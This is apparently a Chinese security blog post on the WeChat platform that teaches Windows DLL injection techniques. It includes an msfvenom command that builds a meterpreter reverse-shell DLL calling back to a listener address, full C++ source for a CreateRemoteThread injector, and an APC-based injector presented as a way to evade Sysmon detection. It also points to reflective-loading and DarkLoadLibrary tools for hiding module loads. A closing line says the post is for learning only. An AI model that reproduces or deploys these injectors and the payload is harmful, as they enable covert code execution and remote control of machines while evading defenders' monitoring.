#  DLL injection

原创 鸿鹄实验室a [ 鸿鹄实验室 ](javascript:void\(0\);)

**鸿鹄实验室** ![]()

微信号 gh_a2210090ba3f

功能介绍 鸿鹄实验室，欢迎关注

____

__

收录于话题

什么是dll注入

  

在Windows操作系统中，运行的每一个进程都生活在自己的程序空间中（保护模式），每一个进程都认为自己拥有整个机器的控制权，每个进程都认为自己拥有计算机的整个内存空间，这些假象都是操作系统创造的（操作系统控制CPU使得CPU启用保护模式）。理论上而言，运行在操作系统上的每一个进程之间都是互不干扰的，即每个进程都会拥有独立的地址空间。比如说进程B修改了地址为0x4000000的数据，那么进程C的地址为0x4000000处的数据并未随着B的修改而发生改变，并且进程C可能并不拥有地址为0x4000000的内存(操作系统可能没有为进程C映射这块内存)。因此，如果某进程有一个缺陷覆盖了随机地址处的内存(这可能导致程序运行出现问题)，那么这个缺陷并不会影响到其他进程所使用的内存。

也正是由于进程的地址空间是独立的（保护模式），因此我们很难编写能够与其它进程通信或控制其它进程的应用程序。

所谓的dll注入即是让程序A强行加载程序B给定的a.dll，并执行程序B给定的a.dll里面的代码。注意，程序B所给定的a.dll原先并不会被程序A主动加载，但是当程序B通过某种手段让程序A“加载”a.dll后，程序A将会执行a.dll里的代码，此时，a.dll就进入了程序A的地址空间，而a.dll模块的程序逻辑由程序B的开发者设计，因此程序B的开发者可以对程序A为所欲为。因为执行命令需要借用某些合法进程，所以一般的进程注入都要绕过AV检测。

  

dll注入实现过程

  

![](https://gitee.com/fuli009/images/raw/master/public/20211015094909.png)

  

即

       1.附加到目标/远程进程

       2.在目标/远程进程内分配内存

       3.将DLL文件路径，或者DLL文件，复制到目标/远程进程的内存空间

       4.控制进程运行DLL文件

  

主要用到的几个函数：

  

OpenProcess、VirtualAllocEx、WriteProcessMemory、CreateRemoteThread

  

既然是dll注入，那么我们肯定需要一个dll，我们使用msf直接生成一个dll出来：

  

  * 

    
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=4444 -f dll -o inject.dll

  

然后手写一个dll注入器：

  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include<Windows.h>#include<stdio.h>  
    using namespace std;  
    int main(int argc,char * argv[]) {  HANDLE ProcessHandle;  LPVOID remotebuffer;  BOOL write;  
      wchar_t dllpath[] = TEXT("C:\\users\\root\\desktop\\inject.dll");  
      if (argc < 2) {    printf("Useage inject.exe Pid;\n");    printf("such as inject.exe 258\n");    exit(0);  }  
      printf("Injecting DLL to PID: %i\n", atoi(argv[1]));  ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));  if (ProcessHandle == NULL) {    printf("OpenProcess Fail !!!");    exit(0);  }  else  {    printf("OpenProcess %i successful !!!\n",atoi(argv[1]));  }  
      remotebuffer = VirtualAllocEx(ProcessHandle, NULL, sizeof dllpath, MEM_COMMIT, PAGE_READWRITE);  write = WriteProcessMemory(ProcessHandle, remotebuffer, (LPVOID)dllpath, sizeof dllpath, NULL);    if (write == 0) {    printf("WriteProcessMemory Fail %i!!!",GetLastError());    exit(0);  }  else  {    printf("WriteProcessMemory  successful !!!\n");  }  
      PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");  CreateRemoteThread(ProcessHandle, NULL, 0, threatStartRoutineAddress, remotebuffer, 0, NULL);  CloseHandle(ProcessHandle);  
      
      return 0;}

  

在进程监控中，也可以清楚的看到进程被注入了dll。

  

![](https://gitee.com/fuli009/images/raw/master/public/20211015094913.png)

  

在上面的注入方式中，我们使用了CreateRemoteThread来进行dll注入，而这个方式在具有Sysmon的系统中会留下Event ID
8的痕迹。而我们使用通过APC实现Dll注入则可以绕过这种监控。

  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <TlHelp32.h>#include <vector>  
    using std::vector;  
    bool FindProcess(PCWSTR exeName, DWORD& pid, vector<DWORD>& tids) {    auto hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);    if (hSnapshot == INVALID_HANDLE_VALUE)        return false;    pid = 0;    PROCESSENTRY32 pe = { sizeof(pe) };    if (::Process32First(hSnapshot, &pe)) {        do {            if (_wcsicmp(pe.szExeFile, exeName) == 0) {                pid = pe.th32ProcessID;                THREADENTRY32 te = { sizeof(te) };                if (::Thread32First(hSnapshot, &te)) {                    do {                        if (te.th32OwnerProcessID == pid) {                            tids.push_back(te.th32ThreadID);                        }                    } while (::Thread32Next(hSnapshot, &te));                }                break;            }        } while (::Process32Next(hSnapshot, &pe));    }    ::CloseHandle(hSnapshot);    return pid > 0 && !tids.empty();}  
    void main(){  DWORD pid;  vector<DWORD> tids;  if (FindProcess(L"calc.exe", pid, tids))   {    printf("OpenProcess\n");    HANDLE hProcess = ::OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);    printf("VirtualAllocEx\n");    auto p = ::VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);    wchar_t buffer[] = L"c:\\test\\testdll.dll";    printf("WriteProcessMemory\n");    ::WriteProcessMemory(hProcess, p, buffer, sizeof(buffer), nullptr);    for (const auto& tid : tids)     {      printf("OpenThread\n");      HANDLE hThread = ::OpenThread(THREAD_SET_CONTEXT, FALSE, tid);      if (hThread)       {        printf("GetProcAddress\n");        ::QueueUserAPC((PAPCFUNC)::GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryW"), hThread, (ULONG_PTR)p);        }    }    printf("VirtualFreeEx\n");    ::VirtualFreeEx(hProcess, p, 0, MEM_RELEASE | MEM_DECOMMIT);  }}

  

反射型dll注入

  

反射DLL注入可以将加密的DLL保存在磁盘（或者以其他形式如shellcode等），之后将其解密放在内存中。之后跟DLL注入一般，使用VirtualAlloc和WriteProcessMemory将DLL写入目标进程。因为没有使用LoadLibrary函数，要想实现DLL的加载运行，我们需要在DLL中添加一个导出函数，ReflectiveLoader，这个函数实现的功能就是加载自身。

  

反射DLL注入实现起来其实十分复杂，需要对PE加载十分了解。通过编写ReflectiveLoader找到DLL文件在内存中的地址，分配装载DLL的空间，并计算
DLL 中用于执行反射加载的导出的内存偏移量，然后通过偏移地址作为入口调用 CreateRemoteThread函数执行。

  

msf已经有了相应的模块：

  

  * 

    
    
    windows/manage/reflective_dll_inject

  

在内存中，可以看到明显的PE标识：

  

![](https://gitee.com/fuli009/images/raw/master/public/20211015094914.png)

  

将其dump后

  

![](https://gitee.com/fuli009/images/raw/master/public/20211015094914.png)

  

放入PE查看工具，可看到其为正常的PE文件与RDI特有的名字：

  

![](https://gitee.com/fuli009/images/raw/master/public/20211015094916.png)

  

此类文件可配合sRdi使用，效果更佳。

  

DarkLoadLibrary

  

DarkLoadLibrary由batsec提出的项目，文章地址：

https://www.mdsec.co.uk/2021/06/bypassing-image-load-kernel-callbacks/

  

项目地址：https://github.com/bats3c/DarkLoadLibrary

  

图标展示了其特点：

  

![](https://gitee.com/fuli009/images/raw/master/public/20211015094918.png)

  

其支持磁盘加载、内存加载。

  

磁盘加载：

  

![](https://gitee.com/fuli009/images/raw/master/public/20211015094919.png)

  

内存加载：

  

![](https://gitee.com/fuli009/images/raw/master/public/20211015094920.png)

  

其DarkLoadLibraryDebugging为自定义的名称，与NO_LINK，则看不到明显的dll加载痕迹

  

![](https://gitee.com/fuli009/images/raw/master/public/20211015094921.png)

  

缺点是仅支持当前进程不支持远程进程，但不得不说，其优越性的确可以是当前进程加载dll的不二之选。

  

     ▼更多精彩推荐，请关注我们▼

  

 **请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

  

![](https://gitee.com/fuli009/images/raw/master/public/20211015094922.png)

  

  

  

![]()

鸿鹄实验室a

![赞赏二维码]() **微信扫一扫赞赏作者** 赞赏

已喜欢，[对作者说句悄悄话](javascript:;)

取消 __

#### 发送给作者

发送

最多40字，当前共字

[](javascript:;) 人赞赏

上一页 [1](javascript:;)/3 下一页

长按二维码向我转账

受苹果公司新规定影响，微信 iOS 版的赞赏功能被关闭，可通过二维码转账支持公众号。

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

DLL injection

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

